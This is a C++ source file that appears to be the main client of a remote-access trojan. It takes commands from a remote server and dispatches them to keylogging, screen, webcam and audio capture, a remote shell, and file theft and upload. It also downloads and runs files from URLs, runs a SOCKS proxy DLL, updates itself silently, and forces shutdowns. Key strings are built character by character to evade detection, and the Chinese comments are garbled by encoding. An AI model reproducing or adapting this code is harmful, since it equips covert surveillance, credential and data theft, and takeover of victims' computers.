// MyClientMain.cpp: implementation of the CMyClientMain class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"

#include "MyClientMain.h"
#include "MyMainTrans.h"
#include "MyVideoTrans.h"
#include "MyFrameTrans.h"
#include "MyTlntTrans.h"
#include "MyAudioTrans.h"
#include "MyDownTrans.h"
#include "MyUpTrans.h"
#include "MyKeyMTrans.h"

extern HINSTANCE ghInstance;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyClientMain::CMyClientMain()
{
	pWorkRet = NULL;
	hWaitEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	bExitWork = FALSE;
}

CMyClientMain::~CMyClientMain()
{
	CloseHandle(hWaitEvent);
}

void CMyClientMain::DoKeepAlive()
{
	while(WaitForSingleObject(hWaitEvent, 120000) == WAIT_OBJECT_0)
	{
		if(!bExitWork)
		{
			::OutputDebugString("DoKeepAlive\n");
			ResetEvent(hWaitEvent);
		}
		else
		{
			break;
		}
	}
	Close();
}

void CMyClientMain::SSH_KeepThread(LPVOID lPvoid)
{
	CMyClientMain* pThis = (CMyClientMain*) lPvoid;
	pThis->DoKeepAlive();
}

void CMyClientMain::DoWork(PSDLLINFO m_Info, DWORD* pRet)
{
	//���ӵ�������
	m_Info.m_ExtInfo = m_Info.m_PassWord;
	if(!Create(WM_CONNECT_MAIN, m_Info))
	{
		return;
	}

	//��������߳�
	HANDLE hThread = (HANDLE) _beginthread(SSH_KeepThread, 0, this);

	//��ʼ����
	GetCmdFromServer(pRet);

	Close();

	//�ȴ��߳��˳�
	bExitWork = TRUE;
	SetEvent(hWaitEvent);
	WaitForSingleObject(hThread, 2000);
}

void CMyClientMain::GetCmdFromServer(DWORD* pWorkRet)
{
	*pWorkRet = 0;
	while(*pWorkRet == 0)
	{
		//���ս�������
		CMDINFO m_CmdInfo = {0};
		if(!RecvData(&m_CmdInfo, sizeof(CMDINFO)))
		{
			break;
		}

		//����
		SetEvent(hWaitEvent);

		//����ȫ�ֱ���
		LPPSDLLINFO pInfo = new PSDLLINFO;
		CopyMemory(pInfo, &m_DllInfo, sizeof(PSDLLINFO));
		pInfo->m_ExtInfo = (DWORD) m_CmdInfo.m_Hwnd;
		pInfo->m_CreateFlag = m_CmdInfo.m_Command;

		//ִ�н�������
		switch(m_CmdInfo.m_Command)
		{
			//�ļ��������̹�������������ڹ���ע�������ļ�����
			case WM_CONNECT_FILE :
			case WM_CONNECT_PROC :
			case WM_CONNECT_SERV :
			case WM_CONNECT_CWND :
			case WM_CONNECT_REGT :
			case WM_CONNECT_FIND :
				_beginthread(SSH_MainThread, 0, pInfo);
				break;

			//�����ն�
			case WM_CONNECT_TLNT :
				_beginthread(SSH_TlntThread, 0, pInfo);
				break;

			//���̼��
			case WM_CONNECT_GET_KEY :
				_beginthread(SSH_KeyMThread, 0, pInfo);
				break;

			//��Ƶ���
			case WM_CONNECT_VIDEO :
				_beginthread(SSH_VideoThread, 0, pInfo);
				break;

			//��Ƶ���
			case WM_CONNECT_AUDIO :
				_beginthread(SSH_AudioThread, 0, pInfo);
				break;

			//��Ļ���
			case WM_CONNECT_FRAM :
				_beginthread(SSH_FramThread, 0, pInfo);
				break;

			//�ļ�����
			case WM_CONNECT_DL_FILE :
				_beginthread(SSH_DlThread, 0, pInfo);
				break;

			//�ļ��ϴ�
			case WM_CONNECT_UP_FILE :
				_beginthread(SSH_UpThread, 0, pInfo);
				break;

			//ִ���ļ�
			case WM_CONNECT_UPLO:
				_beginthread(SSH_FileThread, 0, pInfo);
				break;

			//����SOCKS����
			case WM_CONNECT_SOCKS:
				_beginthread(SSH_SOCKSThread, 0, pInfo);
				break;

			//ִ��URL
			case WM_CONNECT_TURL :
				_beginthread(SSH_TuRlThread, 0, pInfo);
				break;

			//��ʾ����
			case WM_CONNECT_MESS :
				_beginthread(SSH_MessThread, 0, pInfo);
				break;

			//��������
			case WM_CONNECT_LINK :
				_beginthread(SSH_LinkThread, 0, pInfo);
				break;

			//���³���
			case WM_CONNECT_UPDA :
				if(UpdateFile(pInfo))
				{
					*pWorkRet = PS_CLIENT_UNINSTALL;
				}
				break;

			//ж�س���
			case CLIENT_PRO_UNINSTALL :
				delete pInfo;
				*pWorkRet = PS_CLIENT_UNINSTALL;
				break;

			//��������
			case CLIENT_SYSTEM_RESTART :
				delete pInfo;
				*pWorkRet = PS_CLIENT_EXIT;
				ShutDownSystem(FALSE);
				break;

			//�رջ���
			case CLIENT_SYSTEM_SHUTDOWN	:
				delete pInfo;
				*pWorkRet = PS_CLIENT_EXIT;
				ShutDownSystem(TRUE);
				break;

			//��Ч����
			default : 
				delete pInfo;
				break;
		}
	}
}

void CMyClientMain::SSH_TlntThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	CMyTlntTrans m_Trans;
	m_Trans.StartWork(m_DllInfo);
}

void CMyClientMain::SSH_KeyMThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	CMyKeyMTrans m_Trans;
	m_Trans.StartWork(m_DllInfo);
}

void CMyClientMain::SSH_VideoThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	CMyVideoTrans m_Trans;
	m_Trans.StartWork(m_DllInfo);
}

void CMyClientMain::SSH_AudioThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	CMyAudioTrans m_Trans;
	m_Trans.StartWork(m_DllInfo);
}

void CMyClientMain::SSH_MainThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	Type m_SysTemType = CMyClientTran::IsShellSysType();
	if((m_DllInfo.m_CreateFlag == WM_CONNECT_CWND) && (m_SysTemType == Vista || m_SysTemType == Windows7))
	{
		StartUserProcess(&m_DllInfo);
	}
	else
	{
		CMyMainTrans m_Trans;
		m_Trans.StartWork(m_DllInfo);
	}
}

void CMyClientMain::SSH_FramThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	Type m_SysTemType = CMyClientTran::IsShellSysType();
	if(m_SysTemType == Vista || m_SysTemType == Windows7)
	{
		StartUserProcess(&m_DllInfo);
	}
	else
	{
		CMyFrameTrans m_Trans;
		m_Trans.StartWork(m_DllInfo);
	}
}

void CMyClientMain::SSH_DlThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	CMyDownTrans m_Trans;
	m_Trans.StartWork(m_DllInfo);
}

void CMyClientMain::SSH_UpThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	CMyUpTrans m_Trans;
	m_Trans.StartWork(m_DllInfo);
}

void CMyClientMain::SSH_UpdateWaitThread(LPVOID lPvoid)
{
	HANDLE hUpdateWaitEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	WaitForSingleObject(hUpdateWaitEvent, 60 * 1000);
	CloseHandle(hUpdateWaitEvent);

	//֪ͨ�ȴ��̣߳�����
	PostThreadMessage((DWORD) lPvoid, WM_CLOSE_CLIENT_THREAD, FALSE, FALSE);
}

BOOL CMyClientMain::UpdateFile(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	CMyClientTran m_Tran;
	if(!m_Tran.Create(WM_CONNECT_UPDA, m_DllInfo))
	{
		return FALSE;
	}

	//����
	DWORD nLen = 0;
	if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
	{
		return FALSE;
	}

	BYTE* pData = new BYTE[nLen];
	if(!m_Tran.RecvData(pData, nLen))
	{
		delete [] pData;
		return FALSE;
	}

	//�޸ı�־
	//This
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'T';
	m_TempStr[1] = 'h';
	m_TempStr[2] = 'i';
	m_TempStr[3] = 's';
	m_TempStr[4] = 0x00;

	//�޸�EXE���ݱ�־
	DWORD* pCmd = NULL;
	for(DWORD i = 0; i < nLen; i++)
	{
		if(memcmp(&pData[i], m_TempStr, 4) == 0)
		{
			pCmd = (DWORD*) &pData[i + 4];
			break;
		}
	}
	if(pCmd == NULL)
	{
		delete [] pData;
		return FALSE;
	}

	//���±�־
	pCmd[0] = PS_START_UPDATE;

	//��ǰ�߳�ID
	pCmd[1] = GetCurrentThreadId();

	//ԭʼΨһ��ʶ
	char m_sGuid[64] = {0};
	char m_Cmdlines[256] = {0};
	MyMainFunc::BcdToAsc((BYTE*) m_DllInfo.m_ID, (BYTE*) m_sGuid, 16);
	memcpy(pCmd + 2, &m_DllInfo.m_ID, 16);

	//%08x.exe
	m_TempStr[0] = '%';
	m_TempStr[1] = '0';
	m_TempStr[2] = '8';
	m_TempStr[3] = 'x';
	m_TempStr[4] = '.';
	m_TempStr[5] = 'e';
	m_TempStr[6] = 'x';
	m_TempStr[7] = 'e';
	m_TempStr[8] = 0x00;

	char m_TmpFilePath[256] = {0};
	GetTempPath(250, m_TmpFilePath);
	wsprintf(m_TmpFilePath + lstrlen(m_TmpFilePath), m_TempStr, GetCurrentThreadId());
	if(!MyMainFunc::MyWriteFile(m_TmpFilePath, pData, nLen))
	{
		delete [] pData;
		return FALSE;
	}
	delete [] pData;

	/* Update*/
	char m_TmpStr[256] = {0};
	m_TmpStr[0] = (char) 0x20;
	m_TmpStr[1] = (char) 0x00;
	m_TmpStr[1] = (char) 0x55;
	m_TmpStr[2] = (char) 0x70;
	m_TmpStr[3] = (char) 0x00;
	m_TmpStr[3] = (char) 0x64;
	m_TmpStr[4] = (char) 0x61;
	m_TmpStr[5] = (char) 0x00;
	m_TmpStr[5] = (char) 0x74;
	m_TmpStr[6] = (char) 0x65;
	m_TmpStr[7] = 0x00;
	lstrcat(m_TmpFilePath , m_TmpStr);

	//�������½���
	PROCESS_INFORMATION pi = {0};
	STARTUPINFO siStartInfo = {0};
	GetStartupInfo(&siStartInfo);
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.dwFlags = STARTF_USESHOWWINDOW;
	siStartInfo.wShowWindow = SW_HIDE;
	if(!CreateProcess(NULL, m_TmpFilePath, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &pi))
	{
		return FALSE;
	}
	
	//��ظ��³ɹ��߳�
	HANDLE hUpdateWaitThread = (HANDLE) _beginthread(SSH_UpdateWaitThread, 0, (LPVOID) GetCurrentThreadId());

	//�ȴ����½��̽���
	MSG msg;
    while(GetMessage(&msg, 0, 0, 0))
	{
		if(WM_CLOSE_CLIENT_THREAD == msg.message)
		{
			break;
		}
 	}

	if(msg.wParam == 0)
	{
		//����ʧ�ܣ���ֹ���½���
		TerminateProcess(pi.hProcess, 0);
	}
	return (BOOL) msg.wParam;
}

void CMyClientMain::SSH_SOCKSThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	//������Ϣ�ļ�����
	char m_IniFileName[256] = {0};
	GetModuleFileName(ghInstance, m_IniFileName, 255);
	char* pStart = strrchr(m_IniFileName, '\\');
	*pStart = 0x00;
	wsprintf(pStart, "\\%sza.ini", m_DllInfo.m_ServiceName);

	//�������ļ�����
	char m_DllFileName[256] = {0};
	GetModuleFileName(ghInstance, m_DllFileName, 255);
	pStart = strrchr(m_DllFileName, '\\');
	*pStart = 0x00;
	wsprintf(pStart, "\\%sza.dll", m_DllInfo.m_ServiceName);

	if(m_DllInfo.m_ExtInfo == 0x01)
	{
		CMyClientTran m_Tran;
		if(!m_Tran.Create(WM_CONNECT_SOCKS, m_DllInfo))
		{
			return;
		}

		//����
		DWORD nLen = 0;
		if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
		{
			return;
		}

		BYTE* pData = new BYTE[nLen];
		if(!m_Tran.RecvData(pData, nLen))
		{
			delete [] pData;
			return;
		}

		//�����ļ�
		LPMYSOCKSINFO pSockInfo = (LPMYSOCKSINFO) pData;

		if(!MyMainFunc::MyWriteFile(m_IniFileName, pData, sizeof(MYSOCKSINFO)))
		{
			delete [] pData;
			return;
		}

		if(!MyMainFunc::MyWriteFile(m_DllFileName, pData + sizeof(MYSOCKSINFO), nLen - sizeof(MYSOCKSINFO)))
		{
			delete [] pData;
			return;
		}

		delete [] pData;

		//����SOCKS����
		HMODULE hSocksMd = LoadLibrary(m_DllFileName);
		if(hSocksMd != NULL)
		{
			STARTMYKEY StartMyKey = (STARTMYKEY) GetProcAddress(hSocksMd, "StartSocks");
			if(StartMyKey != NULL)
			{
				StartMyKey();
			}

			//��������
			FreeLibrary(hSocksMd);
		}

	}
	else
	{
		//�ر�SOCKS����
		DeleteFile(m_IniFileName);

		//�鿴�Ƿ���socks����
		HMODULE hSocksMd = LoadLibrary(m_DllFileName);
		if(hSocksMd != NULL)
		{
			STARTMYKEY StartMyKey = (STARTMYKEY) GetProcAddress(hSocksMd, "StopSocks");
			if(StartMyKey != NULL)
			{
				StartMyKey();
			}

			//��������
			FreeLibrary(hSocksMd);
		}
		DeleteFile(m_DllFileName);
	}
}

void CMyClientMain::SSH_FileThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	CMyClientTran m_Tran;
	if(!m_Tran.Create(WM_CONNECT_UPLO, m_DllInfo))
	{
		return;
	}

	//����
	DWORD nLen = 0;
	if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
	{
		return;
	}

	BYTE* pData = new BYTE[nLen];
	if(!m_Tran.RecvData(pData, nLen))
	{
		delete [] pData;
		return;
	}

	LPMYUPLOADINFO pUpLoadInfo = (LPMYUPLOADINFO) pData;

	//%08x.%s
	char m_TempStr[256] = {0};
	m_TempStr[0] = '%';
	m_TempStr[1] = '0';
	m_TempStr[2] = '8';
	m_TempStr[3] = 'x';
	m_TempStr[4] = '.';
	m_TempStr[5] = '%';
	m_TempStr[6] = 's';
	m_TempStr[7] = 0x00;


	//�����ļ�
	char m_TmpFilePath[512] = {0};
	GetTempPath(250, m_TmpFilePath);
	wsprintf(m_TmpFilePath + lstrlen(m_TmpFilePath), m_TempStr, GetCurrentThreadId(), pUpLoadInfo->m_FileExt);
	if(!MyMainFunc::MyWriteFile(m_TmpFilePath, pData + sizeof(MYUPLOADINFO), nLen - sizeof(MYUPLOADINFO)))
	{
		delete [] pData;
		return;
	}

	//��������
	ShellExecute(NULL, NULL, m_TmpFilePath, pUpLoadInfo->m_Param, NULL, pUpLoadInfo->m_IsShow);
	delete [] pData;
}

void CMyClientMain::SSH_TuRlThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	char m_Text[512] = {0};
	CMyClientTran m_Tran;
	if(!m_Tran.Create(WM_CONNECT_TURL, m_DllInfo))
	{
		return;
	}

	//����
	DWORD nLen = 0;
	if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
	{
		return;
	}

	char* pData = new char[nLen + 4096];
	if(!m_Tran.RecvData(pData, nLen))
	{
		delete [] pData;
		return;
	}
	pData[nLen] = 0x00;

	char* pFind = strrchr(pData, '.');
	if(pFind == NULL)
	{
		delete [] pData;
		return;
	}

	//%08x%s
	char m_TempStr[256] = {0};
	m_TempStr[0] = '%';
	m_TempStr[1] = '0';
	m_TempStr[2] = '8';
	m_TempStr[3] = 'x';
	m_TempStr[4] = '%';
	m_TempStr[5] = 's';
	m_TempStr[6] = 0x00;

	char m_TmpFilePath[256] = {0};
	GetTempPath(250, m_TmpFilePath);
	wsprintf(m_TmpFilePath + lstrlen(m_TmpFilePath), m_TempStr, GetCurrentThreadId(), pFind);
	if(MyMainFunc::GetUrlFile(pData, m_TmpFilePath))
	{
		ShellExecute(NULL, NULL, m_TmpFilePath, NULL, NULL, SW_SHOW);
	}
	delete [] pData;
}

void CMyClientMain::SSH_MessThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	char m_Text[512] = {0};
	CMyClientTran m_Tran;
	if(!m_Tran.Create(WM_CONNECT_MESS, m_DllInfo))
	{
		return;
	}

	//����
	DWORD nLen = 0;
	if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
	{
		return;
	}

	char* pData = new char[nLen + 1];
	if(!m_Tran.RecvData(pData, nLen))
	{
		delete [] pData;
		return;
	}
	pData[nLen] = 0x00;

	Type m_SysTemType = CMyClientTran::IsShellSysType();
	if(m_SysTemType == Vista || m_SysTemType == Windows7)
	{
		DWORD dwSessionID = WTSGetActiveConsoleSessionId();
		DWORD nRet = 0;
		if(pData[0] == '0')
		{
			WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, dwSessionID, "����", strlen("����"), pData + 1, strlen(pData + 1), 
				MB_OKCANCEL | MB_ICONWARNING |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL, 30, &nRet, TRUE);
		}
		else if(pData[0] == '1')
		{
			WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, dwSessionID, "��ʾ", strlen("��ʾ"), pData + 1, strlen(pData + 1), 
				MB_OKCANCEL | MB_ICONQUESTION |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL, 30, &nRet, 0);
		}
		else
		{
			WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, dwSessionID, "����", strlen("����"), pData + 1, strlen(pData + 1), 
				MB_OKCANCEL | MB_ICONERROR |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL, 30, &nRet, 0);
		}
	}
	else
	{
		HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
		HDESK hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
		if(hNewDesktop != NULL)
		{
			SetThreadDesktop(hNewDesktop);
		}
		if(pData[0] == '0')
		{
			MessageBox(NULL, pData + 1, "����", MB_OKCANCEL | MB_ICONWARNING |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL);
		}
		else if(pData[0] == '1')
		{
			MessageBox(NULL, pData + 1, "��ʾ", MB_OKCANCEL | MB_ICONQUESTION |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL);
		}
		else
		{
			MessageBox(NULL, pData + 1, "����", MB_OKCANCEL | MB_ICONERROR |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL);
		}
		SetThreadDesktop(hOldDesktop);
	}
	delete [] pData;
}

void LinkToUrl(LPPSDLLINFO pInfo)
{
	char m_Text[512] = {0};
	CMyClientTran m_Tran;
	if(!m_Tran.Create(WM_CONNECT_LINK, *pInfo))
	{
		return;
	}

	//����
	DWORD nLen = 0;
	if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
	{
		return;
	}

	char* pData = new char[nLen + 1];
	if(!m_Tran.RecvData(pData, nLen))
	{
		delete [] pData;
		return;
	}
	pData[nLen] = 0x00;

	ShellExecute(NULL, NULL, "iexplore.exe", pData + 1, NULL, (pData[0] == '0') ? SW_SHOW : SW_HIDE);
	delete [] pData;
}

void CMyClientMain::SSH_LinkThread(LPVOID lPvoid)
{
	LPPSDLLINFO pInfo = (LPPSDLLINFO) lPvoid;
	PSDLLINFO m_DllInfo;
	CopyMemory(&m_DllInfo, pInfo, sizeof(PSDLLINFO));
	delete [] pInfo;

	Type m_SysTemType = CMyClientTran::IsShellSysType();
	if(m_SysTemType == Vista || m_SysTemType == Windows7)
	{
		StartUserProcess(&m_DllInfo);
	}
	else
	{
		LinkToUrl(&m_DllInfo);
	}
}

BOOL CMyClientMain::StartUserProcess(LPPSDLLINFO pDllInfo)
{
    // Ϊ����ʾ���Ӹ��ӵ��û����棬������Ҫ��Session 0����
    // һ�����̣���������������������û������¡�
    // ���ǿ���ʹ��CreateProcessAsUserʵ����һ���ܡ�

    BOOL bSuccess = FALSE;
    STARTUPINFO si = {0};

    // ������Ϣ
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // ��õ�ǰSession ID
    DWORD dwSessionID = WTSGetActiveConsoleSessionId();

    HANDLE hToken = NULL;

    // ��õ�ǰSession���û�����
    if(!WTSQueryUserToken(dwSessionID, &hToken))
    {
        return FALSE;
    }

    // ��������
    HANDLE hDuplicatedToken = NULL;
    if(!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDuplicatedToken))
    {
        return FALSE;
    }

    // �����û�Session����
    LPVOID lpEnvironment = NULL;
    if(!CreateEnvironmentBlock(&lpEnvironment, hDuplicatedToken, FALSE))
    {
        return FALSE;
    }

	//"%s",%s
	char m_TmpStr[256] = {0};
	m_TmpStr[0] = '"';
	m_TmpStr[1] = '%';
	m_TmpStr[2] = 's';
	m_TmpStr[3] = '"';
	m_TmpStr[4] = ',';
	m_TmpStr[5] = '%';
	m_TmpStr[6] = 's';
	m_TmpStr[7] = 0x00;

	char m_DllFilePath[256] = {0};
	GetModuleFileName(ghInstance, m_DllFilePath, 200);
	TCHAR m_Text[256] = {0};
	wsprintf(m_Text, "rundll32.exe \"%s\",%s ServerAddr=%s;ServerPort=%d;Hwnd=%d;Cmd=%d;DdnsUrl=%s;", m_DllFilePath, "WorkMainF", 
		pDllInfo->m_ServerAddr, pDllInfo->m_ServerPort, pDllInfo->m_ExtInfo, pDllInfo->m_CreateFlag, pDllInfo->m_DdnsUrl);
 
    // �ڸ��Ƶ��û�Session��ִ��Ӧ�ó��򣬴������̡�
    // ͨ��������̣��Ϳ�����ʾ���ָ��ӵ��û�������
    if(!CreateProcessAsUser(hDuplicatedToken, NULL, m_Text, NULL, NULL, FALSE,                    
         NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, NULL, &si, &pi))
    {
        return FALSE;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
	CloseHandle(hToken);
	CloseHandle(hDuplicatedToken);
	DestroyEnvironmentBlock(lpEnvironment);
    return 0;
}

BOOL GetStrValue(LPCTSTR pStr, LPCTSTR pName, LPTSTR pValue)
{
	//%s=
	char m_TempStr[256] = {0};
	m_TempStr[0] = (char) 0x25;
	m_TempStr[1] = (char) 0x00;
	m_TempStr[1] = (char) 0x73;
	m_TempStr[2] = (char) 0x3d;
	m_TempStr[3] = 0x00;

	TCHAR m_Str[MAX_PATH] = {0};
	TCHAR m_Name[MAX_PATH] = {0};
	TCHAR m_Value[MAX_PATH] = {0};
	wsprintf(m_Name, m_TempStr, pName);
	lstrcpy(m_Str, pStr);

	TCHAR* pStart = StrStr(m_Str, pName);
	if(pStart == NULL)
	{
		return FALSE;
	}
	pStart += lstrlen(m_Name);
	
	TCHAR* pEnd = StrChr(pStart, ';');
	if(pEnd == NULL)
	{
		pEnd = m_Str + lstrlen(m_Str);
	}
	CopyMemory(pValue, pStart, (pEnd - pStart) * sizeof(TCHAR));
	pValue[pEnd - pStart] = 0;
	return TRUE;
}

void WINAPI WorkMainF(HWND hwnd, HINSTANCE hinst, char* sCmdLines, int nCmdShow)
{
	PSDLLINFO m_DllInfo = {0};
	char m_TmpStr[256] = {0};
	if(!GetStrValue(sCmdLines, "ServerAddr", m_TmpStr))
	{
		return;
	}
	lstrcpy(m_DllInfo.m_ServerAddr, m_TmpStr);

	if(!GetStrValue(sCmdLines, "ServerPort", m_TmpStr))
	{
		return;
	}
	m_DllInfo.m_ServerPort = StrToInt(m_TmpStr);

	if(!GetStrValue(sCmdLines, "Hwnd", m_TmpStr))
	{
		return;
	}
	m_DllInfo.m_ExtInfo = StrToInt(m_TmpStr);

	if(!GetStrValue(sCmdLines, "Cmd", m_TmpStr))
	{
		return;
	}
	m_DllInfo.m_CreateFlag = StrToInt(m_TmpStr);

	if(!GetStrValue(sCmdLines, "DdnsUrl", m_TmpStr))
	{
		return;
	}
	lstrcpy(m_DllInfo.m_DdnsUrl, m_TmpStr);

	switch(m_DllInfo.m_CreateFlag)
	{
		//��Ļ���
		case WM_CONNECT_FRAM :
			{
				CMyFrameTrans m_Trans;
				m_Trans.StartWork(m_DllInfo);
			}
			break;

		//���ڹ���
		case WM_CONNECT_CWND :
			{
				CMyMainTrans m_Trans;
				m_Trans.StartWork(m_DllInfo);
			}
			break;

		//����ָ������
		case WM_CONNECT_LINK :
			LinkToUrl(&m_DllInfo);
			break;
	
		default : break;
	}
}

void CMyClientMain::ShutDownSystem(BOOL Flag)
{
	//SeShutdownPrivilege
	char m_TempStr[256] = {0};
	m_TempStr[0] = 'S';
	m_TempStr[1] = 'e';
	m_TempStr[2] = 'S';
	m_TempStr[3] = 'h';
	m_TempStr[4] = 'u';
	m_TempStr[5] = 't';
	m_TempStr[6] = 'd';
	m_TempStr[7] = 'o';
	m_TempStr[8] = 'w';
	m_TempStr[9] = 'n';
	m_TempStr[10] = 'P';
	m_TempStr[11] = 'r';
	m_TempStr[12] = 'i';
	m_TempStr[13] = 'v';
	m_TempStr[14] = 'i';
	m_TempStr[15] = 'l';
	m_TempStr[16] = 'e';
	m_TempStr[17] = 'g';
	m_TempStr[18] = 'e';
	m_TempStr[19] = 0x00;

	TOKEN_PRIVILEGES tp;
	LUID luid;
	tp.PrivilegeCount = 1;
	HANDLE m_handle;
	HANDLE hThread = GetCurrentThread();
	LookupPrivilegeValue(NULL,m_TempStr,&luid);
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	ImpersonateSelf(SecurityImpersonation);
	OpenThreadToken(hThread, TOKEN_ADJUST_PRIVILEGES, TRUE, &m_handle);
	AdjustTokenPrivileges(m_handle, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL);
	if(Flag)
	{
		ExitWindowsEx(EWX_POWEROFF, EWX_FORCE);
	}
	else
	{
		ExitWindowsEx(EWX_REBOOT, EWX_FORCE);
	}
}